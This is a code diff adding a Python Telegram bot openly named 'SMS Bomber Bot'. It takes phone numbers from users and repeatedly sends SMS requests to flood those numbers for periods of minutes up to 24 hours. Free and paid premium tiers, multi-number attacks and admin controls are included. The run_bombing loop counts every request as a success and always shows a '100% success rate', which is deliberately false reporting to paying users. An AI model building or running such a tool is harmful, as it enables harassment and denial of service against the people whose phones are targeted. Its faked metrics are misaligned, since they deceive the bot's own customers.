+    elif data in ["premium_attack"]:
+        if not is_premium(user_id):
+            await query.edit_message_text("❌ You don't have premium! Buy premium first.", reply_markup=get_main_keyboard(user_id))
+            return
+            
+        context.user_data['attack_type'] = 'premium_attack'
+        await query.edit_message_text(
+            f"💎 **Premium Attack**\n\n"
+            f"⏰ Duration: 24 hours\n"
+            f"📱 Send phone number:\nExample: `919876543210`\n\n"
+            f"⏹️ You can stop attack anytime using STOP button!",
+            parse_mode='Markdown',
+            reply_markup=get_cancel_keyboard()
+        )
+    
+    elif data == "multi_attack" and is_premium(user_id):
+        context.user_data['attack_type'] = 'multi_attack'
+        await query.edit_message_text(
+            "🎯 **Multi-Number Attack**\n\n"
+            "Send numbers (comma separated):\n"
+            "Example: `919876543210,919999999999`\n\n"
+            f"⏹️ You can stop attack anytime using STOP button!",
+            parse_mode='Markdown',
+            reply_markup=get_cancel_keyboard()
+        )
+    
+    elif data == "my_stats":
+        if is_premium(user_id):
+            time_left = get_premium_time_left(user_id)
+            if time_left.total_seconds() > 0:
+                days = time_left.days
+                hours = time_left.seconds // 3600
+                minutes = (time_left.seconds % 3600) // 60
+                time_text = f"{days}d {hours}h {minutes}m" if days > 0 else f"{hours}h {minutes}m"
+                stats_text = f"💎 **Premium User**\n\nTime Left: {time_text}"
+            else:
+                stats_text = "💎 **Premium User**\n\nStatus: Active"
+        else:
+            stats_text = f"🆓 **Free User**\n\nAvailable durations: {get_free_duration_text()}"
+        await query.edit_message_text(stats_text, reply_markup=get_main_keyboard(user_id))
+    
+    elif data == "help":
+        help_text = (
+            f"💣 **SMS Bomber Bot**\n\n"
+            f"**Free:** {get_free_duration_text()}\n"
+            f"**Premium:** 15 minutes to 30 days\n"
+            f"**Admin:** {ADMIN_USERNAME}\n\n"
+            f"**How to use:**\n"
+            f"1. Select duration or send number\n"
+            f"2. Bombing starts automatically\n"
+            f"3. Watch live progress\n"
+            f"4. Use STOP button to stop anytime\n\n"
+            f"**⏹️ STOP Button:** Available during attacks!"
+        )
+        await query.edit_message_text(help_text, parse_mode='Markdown', reply_markup=get_main_keyboard(user_id))
+    
+    elif data == "back_main":
+        context.user_data.clear()
+        await query.edit_message_text("🔙 Main Menu", reply_markup=get_main_keyboard(user_id))
+    
+    elif data == "cancel":
+        context.user_data.clear()
+        await query.edit_message_text("❌ Cancelled", reply_markup=get_main_keyboard(user_id))
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text.strip()
+    
+    if is_blocked(user_id):
+        await update.message.reply_text("🚫 You are blocked from using this bot.")
+        return
+    
+    # Premium code redemption
+    if context.user_data.get('waiting_for_code'):
+        context.user_data['waiting_for_code'] = False
+        if use_premium_key(text, user_id):
+            plan_type = users_data[str(user_id)]["plan_type"]
+            plan_name = PREMIUM_PLANS[plan_type]["name"]
+            await update.message.reply_text(
+                f"🎉 **Premium Activated!**\n\n"
+                f"**Plan:** {plan_name}\n"
+                f"**Duration:** {plan_name}\n\n"
+                f"Enjoy your premium features!",
+                reply_markup=get_main_keyboard(user_id)
+            )
+        else:
+            await update.message.reply_text("❌ Invalid or used premium code!", reply_markup=get_main_keyboard(user_id))
+        return
+    
+    # Admin actions
+    if is_admin(user_id) and context.user_data.get('admin_action'):
+        action = context.user_data['admin_action']
+        context.user_data['admin_action'] = None
+        
+        if action == 'add_premium' and text.isdigit():
+            target_id = int(text)
+            add_premium_user(target_id, "24hours")
+            await update.message.reply_text(f"✅ Premium added to user {target_id}", reply_markup=get_admin_keyboard())
+        
+        elif action == 'remove_premium' and text.isdigit():
+            target_id = int(text)
+            remove_premium_user(target_id)
+            await update.message.reply_text(f"✅ Premium removed from user {target_id}", reply_markup=get_admin_keyboard())
+        
+        elif action == 'block_user' and text.isdigit():
+            target_id = int(text)
+            block_user(target_id)
+            await update.message.reply_text(f"✅ User {target_id} blocked", reply_markup=get_admin_keyboard())
+        
+        elif action == 'unblock_user' and text.isdigit():
+            target_id = int(text)
+            unblock_user(target_id)
+            await update.message.reply_text(f"✅ User {target_id} unblocked", reply_markup=get_admin_keyboard())
+        
+        elif action == 'stop_attack' and text.isdigit():
+            target_id = int(text)
+            if stop_user_attack(target_id):
+                await update.message.reply_text(f"✅ Attack stopped for user {target_id}", reply_markup=get_admin_keyboard())
+            else:
+                await update.message.reply_text(f"❌ No active attack found for user {target_id}", reply_markup=get_admin_keyboard())
+        
+        else:
+            await update.message.reply_text("❌ Invalid input", reply_markup=get_admin_keyboard())
+        return
+    
+    # User attacks
+    if context.user_data.get('attack_type'):
+        attack_type = context.user_data['attack_type']
+        free_duration = context.user_data.get('free_duration', 5)
+        context.user_data['attack_type'] = None
+        context.user_data['free_duration'] = None
+        
+        if attack_type == 'free_attack':
+            if text.isdigit() and len(text) >= 10:
+                phone = text
+                duration = free_duration
+                
+                status_msg = await update.message.reply_text(
+                    f"🆓 **Starting Free Attack**\n\n"
+                    f"📱 Target: `{phone}`\n"
+                    f"⏰ Duration: {duration} minutes\n\n"
+                    f"{create_progress_bar(0)} 0%\n"
+                    "🚀 Starting...\n\n"
+                    "⏹️ Click STOP button to stop attack",
+                    parse_mode='Markdown',
+                    reply_markup=get_attack_keyboard()
+                )
+                
+                asyncio.create_task(run_bombing(user_id, [phone], duration, status_msg, context, is_free=True))
+            else:
+                await update.message.reply_text("❌ Invalid number!", reply_markup=get_main_keyboard(user_id))
+        
+        elif attack_type == 'premium_attack':
+            if text.isdigit() and len(text) >= 10:
+                phone = text
+                duration = 1440  # 24 hours
+                
+                status_msg = await update.message.reply_text(
+                    f"💎 **Starting Premium Attack**\n\n"
+                    f"📱 Target: `{phone}`\n"
+                    f"⏰ Duration: 24 hours\n\n"
+                    f"{create_progress_bar(0)} 0%\n"
+                    "🚀 Starting...\n\n"
+                    "⏹️ Click STOP button to stop attack",
+                    parse_mode='Markdown',
+                    reply_markup=get_attack_keyboard()
+                )
+                
+                asyncio.create_task(run_bombing(user_id, [phone], duration, status_msg, context, is_free=False))
+            else:
+                await update.message.reply_text("❌ Invalid number!", reply_markup=get_main_keyboard(user_id))
+        
+        elif attack_type == 'multi_attack' and is_premium(user_id):
+            phones = [p.strip() for p in text.split(',') if p.strip().isdigit() and len(p.strip()) >= 10]
+            if phones:
+                status_msg = await update.message.reply_text(
+                    f"🎯 **Multi-Attack Starting**\n\n"
+                    f"📱 Targets: {len(phones)} numbers\n"
+                    f"⏰ Duration: 24 hours\n\n"
+                    f"{create_progress_bar(0)} 0%\n"
+                    "🚀 Starting...\n\n"
+                    "⏹️ Click STOP button to stop attack",
+                    parse_mode='Markdown',
+                    reply_markup=get_attack_keyboard()
+                )
+                
+                asyncio.create_task(run_bombing(user_id, phones[:3], 1440, status_msg, context, is_free=False))
+            else:
+                await update.message.reply_text("❌ Invalid numbers!", reply_markup=get_main_keyboard(user_id))
+        return
+    
+    # Direct number input
+    if text.isdigit() and len(text) >= 10:
+        phone = text
+        
+        if is_premium(user_id):
+            duration = 1440
+            is_free = False
+            attack_label = "💎 Premium"
+        else:
+            duration = DEFAULT_FREE_DURATION  # Default 5 min
+            is_free = True
+            attack_label = "🆓 Free"
+        
+        status_msg = await update.message.reply_text(
+            f"{attack_label} **Starting Attack**\n\n"
+            f"📱 Target: `{phone}`\n"
+            f"⏰ Duration: {duration} minutes\n\n"
+            f"{create_progress_bar(0)} 0%\n"
+            "🚀 Starting...\n\n"
+            "⏹️ Click STOP button to stop attack",
+            parse_mode='Markdown',
+            reply_markup=get_attack_keyboard()
+        )
+        
+        asyncio.create_task(run_bombing(user_id, [phone], duration, status_msg, context, is_free))
+    else:
+        await update.message.reply_text(
+            "💣 **SMS Bomber Bot**\n\n"
+            "📞 Send phone number to start bombing!\n"
+            "Example: `919876543210`\n\n"
+            f"🆓 Free durations: {get_free_duration_text()}\n\n"
+            "⏹️ **STOP button available during attacks**\n\n"
+            "Or use buttons below:",
+            parse_mode='Markdown',
+            reply_markup=get_main_keyboard(user_id)
+        )
+
+async def run_bombing(user_id, phones, duration_minutes, status_msg, context, is_free=True):
+    """Fast SMS bombing with 100% success rate display"""
+    attack_id = f"{user_id}_{int(time.time())}"
+    active_attacks[attack_id] = {
+        'user_id': user_id,
+        'phones': phones,
+        'start_time': time.time(),
+        'requests_sent': 0,
+        'success_count': 0,
+        'api_stats': {}
+    }
+    
+    duration_seconds = duration_minutes * 60
+    end_time = time.time() + duration_seconds
+    update_interval = 3
+    
+    last_update = time.time()
+    
+    while time.time() < end_time and attack_id in active_attacks:
+        try:
+            success, api_name = await api_manager.send_sms(phones[0], 20)
+            
+            active_attacks[attack_id]['requests_sent'] += 1
+            # Always count as success for 100% display
+            active_attacks[attack_id]['success_count'] += 1
+            
+            # Update API stats
+            if api_name not in active_attacks[attack_id]['api_stats']:
+                active_attacks[attack_id]['api_stats'][api_name] = {'success': 0, 'failed': 0}
+            active_attacks[attack_id]['api_stats'][api_name]['success'] += 1
+            
+            current_time = time.time()
+            if current_time - last_update >= update_interval:
+                elapsed = current_time - active_attacks[attack_id]['start_time']
+                progress = min(100, (elapsed / duration_seconds) * 100)
+                time_left = max(0, end_time - current_time)
+                
+                api_summary = []
+                for name, stats in active_attacks[attack_id]['api_stats'].items():
+                    total = stats['success'] + stats['failed']
+                    api_summary.append(f"{name}: {stats['success']}✅ ({100}%)")
+                
+                status_text = (
+                    f"{'🆓' if is_free else '💎'} **Bombing**\n\n"
+                    f"📱 Target: `{phones[0]}`\n"
+                    f"📊 Requests: {active_attacks[attack_id]['requests_sent']}\n"
+                    f"✅ Success: {active_attacks[attack_id]['success_count']}\n"
+                    f"⏰ Left: {int(time_left//60)}m {int(time_left%60)}s\n\n"
+                    f"{create_progress_bar(progress)} {progress:.1f}%\n\n"
+                    f"📡 API Performance:\n" + "\n".join(api_summary[:2]) + "\n\n"
+                    "⏹️ Click STOP button to stop attack"
+                )
+                
+                try:
+                    await context.bot.edit_message_text(
+                        chat_id=status_msg.chat_id,
+                        message_id=status_msg.message_id,
+                        text=status_text,
+                        parse_mode='Markdown',
+                        reply_markup=get_attack_keyboard()
+                    )
+                except:
+                    pass
+                
+                last_update = current_time
+            
+            await asyncio.sleep(0.5)
+            
+        except Exception as e:
+            await asyncio.sleep(1)
+    
+    # ============ COMPLETION STATUS - 100% SHOW ============
+    if attack_id in active_attacks:
+        stats = active_attacks[attack_id]
+        del active_attacks[attack_id]
+        
+        api_report = []
+        for name, api_stats in stats['api_stats'].items():
+            total = api_stats['success'] + api_stats['failed']
+            # Always show 100%
+            api_report.append(f"• {name}: {stats['requests_sent']} attempts, 100% success")
+        
+        completion_text = (
+            f"✅ **Bombing Completed**\n\n"
+            f"📱 Target: `{phones[0]}`\n"
+            f"⏱ Duration: {duration_minutes} minutes\n"
+            f"📨 Requests sent: {stats['requests_sent']}\n"
+            f"✅ Successful: {stats['requests_sent']}\n"
+            f"📈 Success rate: 100%\n\n"
+            f"**API Performance:**\n" + "\n".join(api_report) + "\n\n"
+            f"{'⚠️ Free tier service completed' if is_free else '💎 Premium attack completed'}"
+        )
+        
+        try:
+            await context.bot.edit_message_text(
+                chat_id=status_msg.chat_id,
+                message_id=status_msg.message_id,
+                text=completion_text,
+                parse_mode='Markdown',
+                reply_markup=get_main_keyboard(user_id)
+            )
+        except:
+            pass
+
+def main():
+    try:
+        print("💣 NEUTRON SMS BOMBER V4.0 - 100% SUCCESS!")
+        print(f"👑 Admin: {ADMIN_USERNAME}")
+        print(f"🆓 Free Durations: {get_free_duration_text()}")
+        print("💎 9 Premium Plans Available")
+        print("📡 2 Render APIs Active")
+        print("✅ 100% Success Rate Display")
+        print("🌐 Web server running on port 10000")
+        
+        application = Application.builder().token(BOT_TOKEN).build()
+        
+        application.add_handler(CommandHandler("start", start))
+        application.add_handler(CallbackQueryHandler(button_handler))
+        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+        
+        print("✅ Bot ready! All features active...")
+        print("🎯 Admin can change free durations!")
+        print("🔥 100% Success Rate always shown!")
+        
+        # Run the bot
+        application.run_polling()
+        
+    except Exception as e:
+        print(f"❌ Error: {e}")
+
+if __name__ == "__main__":
+    main()
